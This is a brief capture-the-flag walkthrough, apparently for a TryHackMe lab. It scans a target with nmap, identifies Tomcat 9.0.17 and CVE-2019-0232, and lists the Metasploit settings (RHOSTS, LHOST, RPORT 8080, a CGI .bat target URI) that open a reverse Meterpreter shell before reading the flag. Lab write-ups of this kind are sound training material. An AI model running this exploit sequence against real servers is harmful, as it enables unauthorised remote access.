# Ready, set, elf.


- What is the version number of the web server?

	- `nmap -sV <TARGET_IP>` (Remember, if it says "host seems down", use `-Pn`, look for what it means)
	- `9.0.17`

- What CVE can be used to create a Meterpreter entry onto the machine? (Format: CVE-XXXX-XXXX)

	- `msfconsole`
	- `search tomcat 9`
	- It outputs `exploit/windows/http/tomcat_cgi_cmdlineargs  2019-04-10`. googling then...
	- `CVE-2019-0232`

- Set your Metasploit settings appropriately and gain a foothold onto the deployed machine.

	no answer needed

	- after search, It should outputs only one exploit, anyway use `use 0` if the output is only one, or the appropriate number
	- `set RHOSTS <TARGET_IP>`
	- `set RPORT 8080`
	- `set LHOST <YOUR_IP>`
	- `set targeturi /cgi-bin/elfwhacker.bat`
	- `run` or `exploit`

- What are the contents of flag1.txt?

	- `cat flag1.txt`
	- `thm{********_***_***_*****}`

- Looking for a challenge? Try to find out some of the vulnerabilities present to escalate your privileges!

	no answer needed



